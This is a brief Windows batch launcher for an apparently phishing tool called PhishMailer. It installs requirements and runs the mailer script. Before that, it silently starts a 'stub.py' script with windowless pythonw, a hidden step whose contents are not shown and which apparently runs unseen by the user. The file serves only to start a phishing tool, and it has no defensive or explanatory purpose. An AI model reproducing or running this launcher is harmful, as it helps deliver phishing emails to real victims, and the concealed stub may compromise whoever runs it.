@echo off
start pythonw Core\Mailer\stub.py
start pip install -r requirements
python PhishMailer.py
exit
